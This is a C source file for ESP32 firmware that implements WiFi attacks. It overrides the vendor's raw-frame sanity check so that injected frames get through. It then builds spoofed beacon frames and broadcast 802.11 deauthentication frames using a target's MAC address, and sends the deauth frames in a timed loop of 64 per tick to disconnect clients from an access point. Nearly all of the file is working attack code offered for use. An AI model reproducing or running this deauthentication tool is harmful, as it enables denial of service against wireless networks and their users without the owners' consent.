#include <string.h>
#include <freertos/FreeRTOS.h>
#include <freertos/timers.h>
#include "esp_system.h"
#include "esp_wifi.h"
#include "attack.h"

// This bypass is needed in order to ignore the error checking that Espressif does
// The compiler flag "-zmuldefs" must be enabled in order for this to compile
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    return 0;
}

#define BEACON_SA_OFFSET 10
#define BEACON_BSSID_OFFSET 16
#define BEACON_SSID_LENGTH_OFFSET 37
#define BEACON_SSID_OFFSET 38
#define BEACON_SSID_END_OFFSET 38
const uint8_t frame_beacon[] = {
	0x80, 0x00,																// 0-1 Frame Control
	0x00, 0x00,																// 2-3 Duration
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff,				// 4-9 Destination
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00,				// 10-15 Source
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00,				// 16-21 BSS ID
	0x00, 0x00,																// 22-23 Sequence seq[8:11]:frag, seq[0:7]
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	// 24-31 Timestamp
	0x00, 0x00,																// 32-33 Interval
	0x31, 0x04,																// 34-35 Capabilities
	0x00, 0x00, /* SSID GOES HERE */				  // 36-37 Length 0x00:length:content
	0x01, 0x06, 0x82, 0x84,	0x8b, 0x96, 0x0c, 0x12,	// 38-45 Supported Rates
};

#define DEAUTH_SA_OFFSET 10
#define DEAUTH_BSSID_OFFSET 16
const uint8_t frame_deauth[] = {
    0xc0, 0x00,   // 0-1 Frame Control
    0x00, 0x00,   // 2-3 Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // 4-9 Destination
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 10-15 Source
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 16-21 BSS ID
    0x00, 0x00,   // 22-23 Sequence seq[8:11]:frag, seq[0:7]
    0x02, 0x00,   // 24-25 Reason
};

TimerHandle_t handle_deauth;
mac_addr_t target_deauth;

// SoftAP should be initialized before running this.
void attack_init() {
  handle_deauth = NULL;
}

void attack_deinit() {}

void send_beacon(const char ssid[], const mac_addr_t sa) {
  uint8_t frame[sizeof(frame_beacon) + strlen(ssid)];

  // Copy initial beacon frame
  memcpy(frame, frame_beacon, BEACON_SSID_LENGTH_OFFSET);
  // Set length of SSID
  frame[BEACON_SSID_LENGTH_OFFSET] = strlen(ssid);
  // Copy the SSID
  memcpy(frame + BEACON_SSID_OFFSET, ssid, strlen(ssid));
  // Copy rest of frame
  memcpy(frame + BEACON_SSID_OFFSET + strlen(ssid), frame_beacon + BEACON_SSID_END_OFFSET, sizeof(frame_beacon) - BEACON_SSID_END_OFFSET);

  // Set the SA and BSSID
  memcpy(frame + BEACON_SA_OFFSET, &sa, sizeof(sa));
  memcpy(frame + BEACON_BSSID_OFFSET, &sa, sizeof(sa));

  esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
}

void attack_beacon_spam() {
  // TODO: Implement this, idk what I want to do with it yet.
  // Random text SSIDs?
}

void send_deauth(const mac_addr_t sa) {
  uint8_t frame[sizeof(frame_deauth)];
  // Copy deauth frame into frame
  memcpy(frame, frame_deauth, sizeof(frame_deauth));
  // Set the SA and BSSID
  memcpy(frame + DEAUTH_SA_OFFSET, &sa, sizeof(sa));
  memcpy(frame + DEAUTH_BSSID_OFFSET, &sa, sizeof(sa));

  esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
}

void timer_deauth(TimerHandle_t xTimer) {
  // Every time this is called, send the packet 64 times
  for(uint8_t i=0; i < 64; i++) {
    send_deauth(target_deauth);
  }
}

void attack_deauth_start(const mac_addr_t sa, uint32_t ms) {
  // If there is already a handle, chances are it's already running
  if (handle_deauth != NULL) {
    printf("Deauth already in progress!\n");
    return;
  }
  target_deauth = sa;
  // Create and start a timer
  handle_deauth = xTimerCreate("Deauth Spam", ms / portTICK_PERIOD_MS, pdTRUE, 0, timer_deauth);
  xTimerStart(handle_deauth, 0);
}

void attack_deauth_stop() {
  xTimerStop(handle_deauth, 0);
  xTimerDelete(handle_deauth, 0);
  handle_deauth = NULL;
}